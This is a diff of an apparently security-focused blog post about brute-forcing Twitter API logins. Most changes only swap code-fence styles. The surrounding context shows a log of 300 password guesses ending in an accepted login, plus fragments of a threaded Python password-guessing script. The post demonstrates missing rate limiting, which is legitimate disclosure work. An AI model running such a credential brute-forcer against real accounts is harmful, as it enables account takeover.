@@ -116,8 +116,7 @@ Well, let's see. Using a simple python program that tried known
 incorrect passwords as fast as the the API would respond (but well below
 DOS thresholds), we have this:
 
-```
-
+~~~
 [~]% time python twitterauthcheck.py
 Login: _eeeeeeeek Password: 0 failed: HTTP Error 401: Unauthorized
 Login: _eeeeeeeek Password: 1 failed: HTTP Error 401: Unauthorized
@@ -134,8 +133,7 @@ Login: _eeeeeeeek Password: 298 failed: HTTP Error 401: Unauthorized
 Login: _eeeeeeeek Password: 299 failed: HTTP Error 401: Unauthorized
 Login: _eeeeeeeek Password: <redacted> accepted
 /opt/local/bin/python2.6 testingauth.py  2.03s user 1.47s system 1% cpu 4:25.05 total
-
-```
+~~~
 
 So looking at the details we have 300 passwords attempted in 2 minutes
 and 3 seconds. We can also see on the 300th attempt the password was
@@ -191,7 +189,7 @@ _Please note, the code is provided for demonstration purposes only, should not b
 
 The command is as follows: `twitterauthcheck.py username passwordlist.txt`
 
-```python
+~~~ python
 import threading,Queue
 import socket
 import tweethon
@@ -200,7 +198,7 @@ import socket
 import sys
 
 class Threader:
-    # Class taken from: Sept 3 2004, Justin A: http://code.activestate.com/recipes/302746/
+    
     def __init__(self, numthreads):
         self._numthreads=numthreads
 
@@ -296,7 +294,8 @@ class twitterpasswordtester(Threader):
 z = twitterpasswordtester(10)
 for n,ns in  a.run():
     print n,ns
-```
+
+~~~
 
 Tweethon Source: [http://bitbucket.org/jrossi/tweethon/src/tip/README](http://bitbucket.org/jrossi/tweethon/src/tip/README)
 
